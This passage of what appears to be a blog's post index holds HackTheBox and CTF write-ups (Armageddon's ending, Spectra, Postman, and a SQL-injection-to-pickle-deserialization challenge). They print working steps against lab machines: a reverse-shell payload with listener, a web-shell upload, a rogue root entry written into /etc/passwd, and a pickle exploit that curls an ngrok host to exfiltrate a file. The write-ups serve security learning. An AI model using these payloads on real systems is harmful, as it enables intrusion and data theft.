[dirty_sock@armageddon brucetherealadmin]$ clear [dirty_sock@armageddon brucetherealadmin]$ sudo -i  We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:      #1) Respect the privacy of others.     #2) Think before you type.     #3) With great power comes great responsibility.  [sudo] password for dirty_sock: [root@armageddon ~]# whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; ifconfig &amp;&amp; wc /root/root.txt root uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 armageddon.htb ens192: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.233  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 fe80::7648:5ea1:5371:b3b5  prefixlen 64  scopeid 0x20&lt;link&gt;         inet6 dead:beef::69d1:bb00:780c:f997  prefixlen 64  scopeid 0x0&lt;global&gt;         ether 00:50:56:b9:67:2f  txqueuelen 1000  (Ethernet)         RX packets 796  bytes 74029 (72.2 KiB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 495  bytes 75975 (74.1 KiB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 194  bytes 17960 (17.5 KiB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 194  bytes 17960 (17.5 KiB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0   Trophy It is not the monsters we should be afraid of; it is the people that don‚Äôt recognize the same monsters inside of themselves. - Shannon L. Alder   Video"
  },
  
  {
    "title": "HackTheBox - Spectra",
    "url": "/posts/spectra/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2023-03-28 00:00:00 +0200",
    "content": "Introduction Spectra is an easy difficulty box based on ChromeOS. The target runs a web server exposing a testing version of wordpress that leaks mysql credentials. Password reuse allows to get access to the admin area of the main wordpress directory, allowing to upload a malicious plugin and obtain a low privileged access to the machine. Local enumeration allowed then to find readable autologin credentials providing an access as katie, who is member of developers group and is allowed to start and stop jobs through the initctl command with high privileges. Because some jobs have insecure file permissions it was possible to poison one of those insecure .conf file and execute arbitrary command with high privileges, getting access as root.  Improved skills:    Password Hunting   Basic of Wordpress hacking   ChromeOS   Used tools:    nmap   gobuster   wpscan   msfvenom     Enumeration Scanned all TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Spectra] ‚îî‚îÄ$ sudo nmap -p- 10.10.10.229 -sS -Pn -v ... PORT     STATE SERVICE 22/tcp   open  ssh 80/tcp   open  http 3306/tcp open  mysql   Enumerated all TCP ports: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Spectra] ‚îî‚îÄ$ sudo nmap -p22,80,3306 10.10.10.229 -sV -Pn -sT -sC -A -oN scans/open-tcp-ports.txt ... PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp   open  http    nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn't have a title (text/html). 3306/tcp open  mysql   MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)   Nmap discovered three open ports: an ssh service running on port 22, an nginx web server running on port 80 and a mysql service running on port 3306. Because usually SSH offers a minor attack surface respect the other services, target enumeration started from the mysql and http services.  Enumerated port 80 using a web browser and discovered the machine domain name:   Added dns to /etc/hosts file: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Spectra] ‚îî‚îÄ$ sudo nano /etc/hosts ... 10.10.10.229    spectra.htb   Enumerated web directories and files: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Spectra/scans] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.229 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -o p80-direcotires.txt ... /main                 (Status: 301) [Size: 169] [--&gt; http://10.10.10.229/main/] /testing              (Status: 301) [Size: 169] [--&gt; http://10.10.10.229/testing/]  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Spectra/scans] ‚îî‚îÄ$ gobuster dir -u http://10.10.10.229 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -o p80-files.txt ... /index.html           (Status: 200) [Size: 283] /.                    (Status: 301) [Size: 169] [--&gt; http://10.10.10.229/./]   Directory enumeration allowed to discover two different accessible directories (the same showed in the Issue Tracker page).  The /main/ directory, running a wordpress site:   The /testing/ directory, containing a directory list for a wordpress test installation (probably the one on /main/):   Since it was dealing with wordpress, the site was scanned with wpscan. However, anything useful was found: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Spectra] ‚îî‚îÄ$ wpscan --url http://spectra.htb/main ... [+] Headers  | Interesting Entries:  |  - Server: nginx/1.17.4  |  - X-Powered-By: PHP/5.6.40  | Found By: Headers (Passive Detection)  | Confidence: 100% ... [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).  | Found By: Rss Generator (Passive Detection)  |  - http://spectra.htb/main/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;  |  - http://spectra.htb/main/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt; ... [+] Enumerating All Plugins (via Passive Methods)  [i] No plugins Found.  [+] Enumerating Config Backups (via Passive and Aggressive Methods)  Checking Config Backups - Time: 00:00:02 &lt;======================&gt; (137 / 137) 100.00% Time: 00:00:02  [i] No Config Backups Found.   Looking through the directory list instead allowed to find a backup of the wp-admin.php file, containing credentials for the devtest user:     Foothold Trying to access the main administration panel using devtest credentials was a failure, however reusing its password for the administrator user did the job, providing a privileged access to the admin area:   Obtained high privileges over the wordpress installation allowed to upload a malicious plugin and get command execution on the box.  Web Shell: https://github.com/xl7dev/WebShell/blob/master/Php/WordPress%20Shell.php  Uploaded the webshell plugin (zipped php):   Code execution obtained in the context of the nginx user:    From there, a reverse shell was generated and hosted using msfvenom and http.server python module : ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Spectra/exploit] ‚îî‚îÄ$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.24 LPORT=10099 -f elf -o rs.elf [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 68 bytes Final size of elf file: 152 bytes Saved as: rs.elf  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Spectra/exploit] ‚îî‚îÄ$ sudo python3 -m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.229 - - [08/May/2021 18:16:41] \"GET /rs.elf HTTP/1.1\" 200 -   Then the reverse shell was downloaded and executed in order to get an interactive persistent shell:     ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/box/Spectra/exploit] ‚îî‚îÄ$ nc -nlvp 10099 listening on [any] 10099 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.229] 44138 id uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)   Lateral Movement Local enumeration showed that the target was a Chrome OS system: uname -a Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux cat /etc/*-release BUILD_NUMBER=22 CHROMEOVER_BUILD_COMMIT=829e617e7b8467c355f9bd61f87835bfeb0da547 CHROMIUMOS_MANIFEST_COMMIT=38c4f6ca60a47f7fabf0fcd5d6feabf349e3f002 CHROMIUM_BROWSER_COMMIT=ef24d0b3349c2324d18a3f32bc35d14e796aeddc PIPELINE_TAG=prod USE_FLAGS=-cros-debug beerover virtualbox GOOGLE_RELEASE=87.3.41 CHROMEOS_RELEASE_BRANCH_NUMBER=85 CHROMEOS_RELEASE_TRACK=stable-channel CHROMEOS_RELEASE_KEYSET=devkeys CHROMEOS_RELEASE_NAME=Chromium OS CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update CHROMEOS_RELEASE_BOARD=chromeover64 CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/ CHROMEOS_RELEASE_BUILD_NUMBER=13505 CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1} CHROMEOS_RELEASE_CHROME_MILESTONE=87 CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352 CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware CHROMEOS_RELEASE_VERSION=87.3.41 CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64  [+] Operative system [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits Linux version 5.4.66+ (neverware@cloudready-builder) (Chromium OS 11.0_pre399094_p20200824-r6 clang version 11.0.0 (/var/tmp/portage/sys-devel/llvm-11.0_pre399094_p20200824-r6/work/llvm-11.0_pre399094_p20200824/clang 83080a294ad7d145d7 58821bcf4354ad0cb7d299)) #1 SMP Tue Dec 22 13:39:49 UTC 2020   Looking around for the system, an insecure autologin configuration file was discovered. The file referenced to another insecure file, containing clear text credentials: cd /opt ls -al total 44 drwxr-xr-x 10 root root 4096 Feb  3 16:42 . drwxr-xr-x 22 root root 4096 Feb  2 14:52 .. drwxr-xr-x  2 root root 4096 Jun 28  2020 VirtualBox -rw-r--r--  1 root root  978 Feb  3 16:02 autologin.conf.orig drwxr-xr-x  2 root root 4096 Jan 15 15:53 broadcom drwxr-xr-x  2 root root 4096 Jan 15 15:54 displaylink drwxr-xr-x  2 root root 4096 Jan 15 15:53 eeti drwxr-xr-x  5 root root 4096 Jan 15 15:55 google drwxr-xr-x  6 root root 4096 Feb  2 15:15 neverware drwxr-xr-x  5 root root 4096 Jan 15 15:54 tpm1 drwxr-xr-x  5 root root 4096 Jan 15 15:54 tpm2 cat autologin.conf.orig # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. description   \"Automatic login at boot\" author        \"chromium-os-dev@chromium.org\" # After boot-complete starts, the login prompt is visible and is accepting # input. start on started boot-complete script   passwd=   # Read password from file. The file may optionally end with a newline.   for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do     if [ -e \"${dir}/passwd\" ]; then       passwd=\"$(cat \"${dir}/passwd\")\"       break     fi   done   if [ -z \"${passwd}\" ]; then     exit 0   fi   # Inject keys into the login prompt.   #   # For this to work, you must have already created an account on the device.   # Otherwise, no login prompt appears at boot and the injected keys do the   # wrong thing.   /usr/local/sbin/inject-keys.py -s \"${passwd}\" -k enter end scriptc  cd /etc/autologin ls -al total 12 drwxr-xr-x  2 root root 4096 Feb  3 16:43 . drwxr-xr-x 63 root root 4096 Feb 11 10:24 .. -rw-r--r--  1 root root   19 Feb  3 16:43 passwd cat passwd SummerHereWeCome!!   The password was then reused to login as katie: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Spectra] ‚îî‚îÄ$ ssh katie@10.10.10.229 Password: katie@spectra ~ $ whoami katie   Privilege Escalation Enumerating katie privileges it was noticed that she was part of the developers group and she was able to run /sbin/initctl with high privileges: katie@spectra /etc/init $ whoami katie katie@spectra /etc/init $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)  katie@spectra ~ $ sudo -l User katie may run the following commands on spectra:     (ALL) SETENV: NOPASSWD: /sbin/initctl   initctl is a tool used to start and stop jobs. Available jobs are usually located under /etc/init/. Searching for writable .conf file it turned out that multiple test file was owned by root but allowed write permission to the member of the developers group: katie@spectra /etc/init $ find /etc/init -gid 20158 /etc/init/test6.conf /etc/init/test7.conf /etc/init/test3.conf /etc/init/test4.conf /etc/init/test.conf /etc/init/test8.conf /etc/init/test9.conf /etc/init/test10.conf /etc/init/test2.conf /etc/init/test5.conf /etc/init/test1.conf   The misconfiguration allowed to poison one of the test.conf file and inject a payload which added a new root user once the job was started: katie@spectra /etc/init $ nano test.conf description \"Test node.js server\" author      \"katie\"  start on filesystem or runlevel [2345] stop on shutdown  script \techo \"root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash\" &gt;&gt; /etc/passwd end script ^X  katie@spectra /etc/init $ sudo /sbin/initctl stop test initctl: Unknown instance: katie@spectra /etc/init $ sudo /sbin/initctl start test test start/running, process 12820 katie@spectra /etc/init $ cat /etc/passwd | grep root root:x:0:0:root:/root:/bin/bash root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash   The malicious root2 user was finally used to login and obtain high privileges: ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Spectra] ‚îî‚îÄ$ ssh root2@10.10.10.229 Password: evil spectra ~ # whoami &amp;&amp; id &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig root uid=0(root) gid=0(root) groups=0(root) d44519713b889d5e1f9e536d0c6df2fc eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500         inet 10.10.10.229  netmask 255.255.255.0  broadcast 10.10.10.255         inet6 dead:beef::250:56ff:feb9:5feb  prefixlen 64  scopeid 0x0&lt;global&gt;         inet6 fe80::250:56ff:feb9:5feb  prefixlen 64  scopeid 0x20&lt;link&gt;         inet6 dead:beef::e082:c752:1943:1f86  prefixlen 64  scopeid 0x0&lt;global&gt;         ether 00:50:56:b9:5f:eb  txqueuelen 1000  (Ethernet)         RX packets 18984  bytes 2394803 (2.2 MiB)         RX errors 0  dropped 131  overruns 0  frame 0         TX packets 27122  bytes 15426070 (14.7 MiB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536         inet 127.0.0.1  netmask 255.0.0.0         inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;         loop  txqueuelen 1000  (Local Loopback)         RX packets 15717  bytes 6158983 (5.8 MiB)         RX errors 0  dropped 0  overruns 0  frame 0         TX packets 15717  bytes 6158983 (5.8 MiB)         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0    Trophy What we know is a drop, what we don't know is an ocean. - Isaac Newton   Video"
  },
  
  {
    "title": "HackTheBox - Postman",
    "url": "/posts/postman/",
    "categories": "Articles & Writeups, HackTheBox",
    "tags": "hackthebox",
    "date": "2023-03-28 00:00:00 +0200",
    "content": "Improved ability:     Redis exploitation   SSH keys cracking   Webmin exploitation   Used tools:     nmap   LinEnum.sh   ssh2john   john   metasploit     Introduction &amp; Foothold  As always, let‚Äôs start scanning the box with namp  $ nmap -sV -O -A -p 1-10000 --script=banner -o nmap.txt 10.10.10.160 # Nmap 7.80 scan initiated Wed Feb 26 21:38:20 2020 as: nmap -sV -O -A -p 1-10000 --script=banner -o nmap.txt 10.10.10.160 Nmap scan report for 10.10.10.160 Host is up (0.047s latency). Not shown: 9996 closed ports PORT      STATE SERVICE VERSION 22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) 6379/tcp  open  redis   Redis key-value store 4.0.9 10000/tcp open  http    MiniServ 1.910 (Webmin httpd) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=2/26%OT=22%CT=1%CU=38345%PV=Y%DS=2%DC=T%G=Y%TM=5E56D77 OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S)  Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 110/tcp) HOP RTT      ADDRESS 1   46.46 ms 10.10.14.1 2   46.53 ms 10.10.10.160  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 26 21:39:17 2020 -- 1 IP address (1 host up) scanned in 57.09 seconds   We can notice the presence of four open ports: two web server on the numbers 80 and 1000 and a Redis daemon on the number 6379.  Enumerating the two web services, we discovered that for this specific version of MiniServ multiple authenticated exploits exists‚Ä¶ they could come in handy later.  About Redis, we can enumerate the service through some NSE scripts, however without getting anything useful except the specific Linux box version (Linux 4.15.0-58-generic x86_64)  $ nmap --script redis-info -sV -p 6379 10.10.10.160 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 22:20 CET Nmap scan report for 10.10.10.160 Host is up (0.047s latency).  PORT     STATE SERVICE VERSION 6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits) | redis-info: |   Version: 4.0.9 |   Operating System: Linux 4.15.0-58-generic x86_64 |   Architecture: 64 bits |   Process ID: 608 |   Used CPU (sys): 81.29 |   Used CPU (user): 27.25 |   Connected clients: 2 |   Connected slaves: 0 |   Used memory: 840.94K |   Role: master |   Bind addresses: |     0.0.0.0 |     ::1 |   Client connections: |     10.10.14.12 |_    10.10.14.27   About Redis:     Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker.   In order to works properly, the program needs a specific user, who can read and write on physical memory ‚Ä¶ in short, a 100% working user. Because of that, once we log into the service, we can read and write into the redis /home directory, and because we know that the user has a valid shell and a valid home, we can inject our personal SSH key in order to gain access through SSH without knowing the right password.    First, I generated a new pair of SSH key with the ssh-keygen command, next, inside the redis home directory, I created the **/.ssh **dir and the authorized_keys file, inside of which I wrote my public SSH key. After those steps, finally I was able to login as redis user, without really know its password.   Lateral movement to Matt  As always, upload and run LinEnum.sh  redis@Postman:/tmp$ ./LinEnum.sh  #########################################################  Local Linux Enumeration &amp; Privilege Escalation Script ######################################################### #www.rebootuser.com #version 0.982  [-] Debug Info [+] Thorough tests = Disabled   Scan started at: Thu Feb 27 09:44:23 GMT 2020   ###SYSTEM############################################## [-] Kernel information: Linux Postman 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux   [-] Kernel information (continued): Linux version 4.15.0-58-generic (buildd@lcy01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019   [-] Specific release information: DISTRIB_ID=Ubuntu DISTRIB_RELEASE=18.04 DISTRIB_CODENAME=bionic DISTRIB_DESCRIPTION=\"Ubuntu 18.04.3 LTS\" NAME=\"Ubuntu\" VERSION=\"18.04.3 LTS (Bionic Beaver)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 18.04.3 LTS\" VERSION_ID=\"18.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=bionic UBUNTU_CODENAME=bionic  [-] Hostname: Postman  ...  [-] Location and Permissions (if accessible) of .bak file(s): -rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak -rw------- 1 root root 695 Aug 25  2019 /var/backups/group.bak -rw------- 1 root shadow 577 Aug 25  2019 /var/backups/gshadow.bak -rw------- 1 root shadow 935 Aug 26  2019 /var/backups/shadow.bak -rw------- 1 root root 1382 Aug 25  2019 /var/backups/passwd.bak   [-] Any interesting mail in /var/mail: total 8 drwxrwsr-x  2 root mail 4096 Aug 24  2019 . drwxr-xr-x 13 root root 4096 Aug 25  2019 ..   ###SCAN COMPLETE####################################   Among the thousands of lines of information returned by the tool, we notice immediately that there is a publicly readable RSA-key‚Äôs backup file belonging to Matt, the user of the machine. Extrapolate and bring it on our local machine in order to try to crack it.  In order to crack an SSH key, first we need to generate an hash from it. To achieve this tasks, we can use ssh2john. Next, after having generate the hash, we can crack it using john:    Gathered the password, try logging in via SSH with Matt user ‚Ä¶ but it does not work. Not a problem, because the same password is valid for switching to the Matt user with the su command.  Privilege Escalation  The privilege escalation process can be achieved easily with Metasploit.  During the enumeration phase we found an authenticated Remote Command Execution exploit fitting the targeted Webmin version: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/webmin_packageup_rce.md     This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the ‚ÄúPackage  Updates‚Äù module can execute arbitrary commands with root privileges via the data parameter to update.cgi.   So let‚Äôs load the module, compile the appropriate fields and execute the exploit. What we will get is a shell with root permissions    Trophy  A hacker does for love what others would not do for money.&lt;br&gt; - Laura Creighton"
  },
  
  {
    "title": "Exploit Arbitrary Deserialization through Blind SQL Injection",
    "url": "/posts/blind-sql-injection-and-arbitrary-deserialization/",
    "categories": "Articles & Writeups, Web Hacking",
    "tags": "XMAS-CTF, pickle, deserialization, sql-injection",
    "date": "2022-12-21 00:00:00 +0100",
    "content": "Introduction    The Elf Resources department needs to keep an eye on what the elves are doing. This site was done in a hurry and they would appreciate if you would take a look.   Improved skills    Exploitation of Bind SQL Injections in SQLite   Exploitation of insecure deserialization vulnerabilities when using python pickle.   Data exfiltration using OAST techniques   Used tools    burpsuite   sqlmap   hackvector (burpsuite extension)   custom python scripts   Video   Writeup [TL;DR] Setup  Connect to the challenge: challs.htsp.ro:13001  Information Gathering  The application at-a-glance üîç  Application home page:    Selected the first elf:    Request:  GET /1 HTTP/1.1 Host: challs.htsp.ro:13001 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://challs.htsp.ro:13001/ Upgrade-Insecure-Requests: 1    The other elves have just different names and images.  Exploitation  Boolean based SQL-Injection     The elf‚Äôs id is vulnerable to boolen-based SQL Injections and can be exploited to enumerate the database   Math is evaluated and executed inside the elf‚Äôs id:    Moreover boolean-based query can be submitted to confirm the SQL Injection:     Verified the SQL Injection also with sqlmap:  $ sqlmap http://challs.htsp.ro:13001/2 --current-db --proxy http://127.0.0.1:8080 --all --batch ... URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests: --- Parameter: #1* (URI)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: http://challs.htsp.ro:13001/2 AND 6613=6613 --- ...     Enumerated the entire db:     Sometimes sqlmap is unable to extract serialized data and just return a void column. Use the --no-cast o --hex flags for those cases.   $ sqlmap http://challs.htsp.ro:13001/2 --current-db --proxy http://127.0.0.1:8080 --all --batch ... URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests: --- Parameter: #1* (URI)     Type: boolean-based blind     Title: AND boolean-based blind - WHERE or HAVING clause     Payload: http://challs.htsp.ro:13001/2 AND 6613=6613 --- ... Database: &lt;current&gt; Table: elves [3 entries] +----+------------------------------------------------------------------------------------------------------------------------------------------+ | id | data                                                                                                                                     | +----+------------------------------------------------------------------------------------------------------------------------------------------+ | 1  | gASVUAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwJU25vd2ZsYWtllIwIYWN0aXZpdHmUjA1QYWNraW5nIGdpZnRzlIwCaWSUTnViLg==             | | 2  | gASVSwAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwEQmVsbJSMCGFjdGl2aXR5lIwNSGVscGluZyBTYW50YZSMAmlklE51Yi4=                     | | 3  | gASVWgAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFU25vd3mUjAhhY3Rpdml0eZSMG0xvb2tpbmcgYXQgdGhlIG5hdWdodHkgbGlzdJSMAmlklE51Yi4= | +----+------------------------------------------------------------------------------------------------------------------------------------------+ ...   SQL Injection + Arbitrary Deserialization  Discovered some python objects inside the DB:  ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/X-MAS/manipulated] ‚îî‚îÄ$ echo 'gASVUAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwJU25vd2ZsYWtllIwIYWN0aXZpdHmUjA1QYWNraW5nIGdpZnRzlIwCaWSUTnViLg==' | base64 -d Packing giftsidNub.                                                                                                                                                                                                                          ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/X-MAS/manipulated] ‚îî‚îÄ$ echo 'gASVWgAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFU25vd3mUjAhhY3Rpdml0eZSMG0xvb2tpbmcgYXQgdGhlIG5hdWdodHkgbGlzdJSMAmlklE51Yi4=' | base64 -d __main__Elf)}(nameSnowactivityooking at the naughty listidNub.                                                                                                                                                                               ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/X-MAS/manipulated] ‚îî‚îÄ$ echo 'gASVSwAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwEQmVsbJSMCGFjdGl2aXR5lIwNSGVscGluZyBTYW50YZSMAmlklE51Yi4=' | base64 -d Helping SantaidNub.     Created a script to craft custom serialized python objects that once unserialized execute arbitrary code:  import pickle import base64 import os  # Credits to m3ssap0  class Elf:     def __init__(self, name, activity, id):         self.name = name         self.activity = activity         self.id = id          def __reduce__(self):         command = \"curl https://229b-93-51-54-187.eu.ngrok.io/`cat flag.txt|base64`\"         return os.system, (command, )  def generate_exploit():     serialized_exploit = base64.b64encode(pickle.dumps(Elf(\"0xbro\", \"pwning\", 0))).decode(\"ascii\")     print(\"Serialized exploit object: %s\" % serialized_exploit)     return serialized_exploit  if __name__ == '__main__':     exploit_object = generate_exploit()   $ python3 script.py  Serialized exploit object: gASVWwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEBjdXJsIGh0dHBzOi8vMjI5Yi05My01MS01NC0xODcuZXUubmdyb2suaW8vYGNhdCBmbGFnLnR4dHxiYXNlNjRglIWUUpQu      What is the SQL query that the server creates to manage this requests?    Assumptions:        select \"/some/path/\"||id from elves where id = &lt;param&gt;     select data from elves where id = &lt;param&gt;         Random junk appended:  Legit object appended:    Exfiltrated the flag  Exploited the SQL Injection to send a request containing the serialized object (the full payload has been urlencoded in order to avoid issues related to special character inside the request):    GET /0%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%27%67%41%53%56%57%77%41%41%41%41%41%41%41%41%43%4d%42%58%42%76%63%32%6c%34%6c%49%77%47%63%33%6c%7a%64%47%56%74%6c%4a%4f%55%6a%45%42%6a%64%58%4a%73%49%47%68%30%64%48%42%7a%4f%69%38%76%4d%6a%49%35%59%69%30%35%4d%79%30%31%4d%53%30%31%4e%43%30%78%4f%44%63%75%5a%58%55%75%62%6d%64%79%62%32%73%75%61%57%38%76%59%47%4e%68%64%43%42%6d%62%47%46%6e%4c%6e%52%34%64%48%78%69%59%58%4e%6c%4e%6a%52%67%6c%49%57%55%55%70%51%75%27 HTTP/1.1 Host: challs.htsp.ro:13001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 Connection: close      url-decode request:  0 union select 'gASVWwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEBjdXJsIGh0dHBzOi8vMjI5Yi05My01MS01NC0xODcuZXUubmdyb2suaW8vYGNhdCBmbGFnLnR4dHxiYXNlNjRglIWUUpQu'   $ ngrok http 10099 ... GET 